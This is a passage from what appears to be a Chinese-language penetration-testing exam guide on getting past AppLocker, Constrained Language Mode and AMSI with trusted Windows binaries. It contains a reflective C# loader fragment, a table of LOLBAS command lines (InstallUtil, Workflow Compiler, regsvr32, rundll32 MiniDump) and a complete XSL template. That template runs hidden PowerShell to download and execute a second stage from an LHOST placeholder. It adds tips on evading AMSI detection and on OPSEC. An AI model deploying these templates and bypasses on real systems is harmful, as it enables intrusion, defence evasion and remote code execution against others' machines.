                        if (!t.IsPublic) continue;
                        var m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
                        if (m != null) { m.Invoke(null, null); return; }
                    }
                }

                // 无出网时的最小验证：写一个标记文件
                File.WriteAllText(Path.Combine(Path.GetTempPath(), "workflow-ran.txt"), whoami());
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("[!] Workflow 载荷失败: " + ex.Message);
            }
        }

        private static string whoami()
        {
            var psi = new ProcessStartInfo("whoami")
            {
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (var p = Process.Start(psi)) { return p.StandardOutput.ReadToEnd(); }
        }
    }
}
````

#### `m05-lolbas-notes.md` {#m05-lolbas-notes-md}

````markdown
# 受信任宿主速查（场景 21–24）

> 用途：AppLocker 拒绝自定义 EXE 时，用**被策略放行的系统程序**承载执行。
> 场景：21（允许目录）、22（DLL 规则宽松）、23（InstallUtil 被拦 → 换宿主）、24（XSL）
> 占位符：`PAYLOAD`、`LHOST`、`URL`、`TARGET`

## 1. 宿主对照表

| 宿主 | 路径（写全路径，别依赖 PATH） | 输入 | 适用场景 | 备注 |
|---|---|---|---|---|
| InstallUtil | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe` | 托管程序集 DLL | 6、23 | `/logfile= /LogToConsole=false /U payload.dll` |
| Workflow Compiler | `...\v4.0.30319\Microsoft.Workflow.Compiler.exe` | XOML + 程序集 | 23 | `payload.xoml output.xml` |
| mshta | `C:\Windows\System32\mshta.exe` | `.hta` / URL | 6–8 | 常被单独监控 |
| msxsl | 非系统自带，需自带 | `.xsl` | 24 | 自带即引入自定义文件，注意 AppLocker |
| wmic | `C:\Windows\System32\wbem\wmic.exe` | `/format:"x.xsl"` | 24 | Win11 24H2+ 可能已移除，先 `where wmic` |
| regsvr32 | `C:\Windows\System32\regsvr32.exe` | `.sct` / DLL | 备选 | `/s /n /u /i:URL scrobj.dll` |
| MSBuild | `...\Framework64\v4.0.30319\MSBuild.exe`（或 VS 目录） | `.csproj` 内联任务 | 备选 | 需要 MSBuild 存在 |
| csc | `...\v4.0.30319\csc.exe` | `.cs` | 备选 | 编译产物仍要落地 |
| rundll32 | `C:\Windows\System32\rundll32.exe` | DLL 导出 / JS | 备选 | `comsvcs.dll, MiniDump` 也走它 |

## 2. 选择顺序（按"最可能被放行 + 最不显眼"）

1. **DLL 规则宽松** → 直接投 DLL 给已允许宿主（场景 22，最省事）
2. **允许目录可写** → 把 payload 放进去再执行（场景 21）
3. **InstallUtil** → 托管程序集（场景 6、23）
4. **Workflow Compiler** → InstallUtil 被拦时（场景 23）
5. **XSL（msxsl/wmic）** → 常规脚本入口受限时（场景 24）
6. **regsvr32 / MSBuild** → 兜底

## 3. 前置检查命令

```powershell
# 有效策略
Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Temp\al.xml

# 宿主是否存在
Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe
Test-Path C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe
where wmic
where mshta

# DLL 规则集是否启用（不启用则 DLL 路线可行）
(Get-AppLockerPolicy -Effective).RuleCollections | Select CollectionType, EnforcementMode
```

## 4. 常见失败与对策

| 现象 | 原因 | 对策 |
|---|---|---|
| `InstallUtil` 报"不是有效的 Win32 应用程序" | 位数不匹配 | 换 `Framework`（32 位）目录 |
| 宿主启动后立刻退出 | 程序集缺少 RunInstaller 特性 | 见 `m05-installutil-runner.cs` |
| 宿主正常但载荷没跑 | 入口签名不匹配 | 用反射列出类型/方法 |
| 命令被策略拒绝 | 路径不在允许列表 | 换宿主或换允许目录 |
| wmic 不存在 | 系统版本已移除 | 换 msxsl / InstallUtil |

## 5. 与其它文档的关系

- 策略枚举细节：`m05-applocker-enum.ps1`
- DLL 旁加载：`docs/04-dll-sideloading.md`
- 场景流程：`docs/05-applocker-clm-amsi.md`
````

**验证**：命令返回无异常；监听端回连；`output.xml` 生成（说明宿主确实执行）。

**失败分支与备选**：
1. Workflow 宿主也被阻止 → 试 XSL（场景 24）、MSBuild、`regsvr32`（脚本宿主）、`mshta`（HTA 路线）。
2. .NET 版本目录不同 → 枚举 `C:\Windows\Microsoft.NET\Framework*` 下所有 `v*` 目录。
3. CLM 影响 PowerShell 调用 → 用 `cmd /c` 直接调用宿主，不经 PowerShell。

**考试注意 / OPSEC**：受信任宿主的价值在于"允许列表内 + 不落地自定义 EXE"；命令要写全路径，避免依赖 PATH。

---

## 场景 24：普通脚本入口受限，但 XSL 处理路线可用

**场景回顾**：常规脚本执行受限，但对应组件仍能处理带脚本逻辑的 XSL，且有效策略允许调用它。

**前提与假设**：
- PowerShell/VBScript 入口被限制。
- `msxsl.exe` 或 `wmic.exe` 可用，且能处理内嵌 JScript/VBScript 的 XSL。

**准备（攻击机侧）**：编写 XSL，内含 `<msxsl:script language="JScript">` 或通过 `wmic` 的格式化执行路径。

**执行步骤**：
1. 用 `msxsl.exe`（若存在）：
   ```cmd
   msxsl.exe payload.xml payload.xsl
   ```
2. 或用 `wmic` 的 XSL 格式化路径：
   ```cmd
   wmic process get brief /format:"C:\Windows\Temp\payload.xsl"
   ```
3. 载荷逻辑写在 XSL 的脚本块里（下载执行/回连）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m05-xsl-exec.xsl` | XSL 脚本执行模板 | 替换 LHOST/URL |
| `m05-lolbas-notes.md` | 宿主调用方式速查 | — |

#### `m05-xsl-exec.xsl` {#m05-xsl-exec-xsl}

````xml
<?xml version="1.0"?>
<!--
用途：XSL 脚本执行模板——通过 msxsl.exe 或 wmic /format 触发内嵌脚本（常规脚本入口受限时的替代）
场景：24（普通脚本入口受限，但 XSL 处理路线可用）
依赖：msxsl.exe（非系统自带）或 wmic.exe（Win10/11 部分版本仍带）
使用：
  1) msxsl：   msxsl.exe payload.xml m05-xsl-exec.xsl
  2) wmic：    wmic process get brief /format:"C:\Windows\Temp\m05-xsl-exec.xsl"
占位符：LHOST/LPORT（回连地址）、URL（第二阶段地址）
测试状态：未在 Windows 实测；XML/XSL 结构已人工核对
-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:msxsl="urn:schemas-microsoft-com:xslt"
                xmlns:user="urn:payload"
                version="1.0">

  <!-- JScript 脚本块：wmic /format 与 msxsl 都会执行 -->
  <msxsl:script language="JScript" implements-prefix="user">
  <![CDATA[
    function run() {
      try {
        var shell = new ActiveXObject("WScript.Shell");
        // 方式 A：PowerShell 下载执行（若 PowerShell 可用）
        var ps = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://LHOST/stage2.ps1')\"";
        shell.Run(ps, 0, false);

        // 方式 B：直接回连验证（无 PowerShell 时）
        // shell.Run("cmd.exe /c curl -s http://LHOST/xsl-ran", 0, false);

        return "ok";
      } catch (e) {
        return "err:" + e.message;
      }
    }
  ]]>
  </msxsl:script>

  <xsl:template match="/">
    <output>
      <xsl:value-of select="user:run()"/>
    </output>
  </xsl:template>
</xsl:stylesheet>
````

**验证**：命令无报错；回连或落地文件出现；`msxsl`/`wmic` 进程确实创建。

**失败分支与备选**：
1. `msxsl.exe` 不存在（默认不随系统安装）→ 用 `wmic` 的 `/format` 路线。
2. XSL 脚本被 AMSI 扫 → 把被检测字符串拆分/编码，或改由 XSL 仅做下载器、第二阶段单独投递。
3. 策略允许 `wmic` 但不允许 `/format` → 换其它受信任宿主（场景 23）。

**考试注意 / OPSEC**：`wmic` 在新系统上可能被移除（Win11 24H2+），考试前先 `where wmic` 确认；XSL 路线的优势是常被策略忽略。

---

## 模块速查表

| 现象 | 命令/动作 |
|---|---|
| 枚举有效 AppLocker 策略 | `Get-AppLockerPolicy -Effective -Xml` |
| 查语言模式 | `$ExecutionContext.SessionState.LanguageMode` |
| 查 Defender 实时保护 | `Get-MpComputerStatus \| fl RealTimeProtectionEnabled` |
| 查 DLL 规则集是否启用 | `(Get-AppLockerPolicy -Effective).RuleCollections \| ? CollectionType -eq 'Dll'` |
| 查目录写权限 | `icacls <dir>`、`accesschk -w <dir>` |
| 受信任宿主 | InstallUtil / Microsoft.Workflow.Compiler / msxsl / wmic / mshta / regsvr32 / MSBuild |
| 托管程序集加载 | `[Reflection.Assembly]::Load($bytes)` + 反射调用入口 |
| CLM 绕过 | 自定义 Runspace（`m05-clm-bypass-runspace.ps1`） |
| AMSI 处理 | `m05-amsi-bypass-variants.ps1` |

## 关联脚本清单

| 脚本 | 说明 |
|---|---|
| `m05-amsi-bypass-variants.ps1` | AMSI 处理多个版本（按宿主选择） |
| `m05-clm-bypass-runspace.ps1` | 自定义 Runspace 绕过 CLM |
| `m05-applocker-enum.ps1` | 枚举有效规则与可写允许路径 |
| `m05-installutil-runner.cs` | InstallUtil 兼容程序集 |
| `m05-workflow-compiler-runner.cs` | Workflow 宿主输入程序集 |
| `m05-xsl-exec.xsl` | XSL 脚本执行模板 |
| `m05-lolbas-notes.md` | 受信任宿主速查 |
| `m13-xor-encoder.py` | shellcode 编码（场景 18 用） |
| `m04-proxy-dll-sideload.c` | Proxy DLL（场景 22 用） |
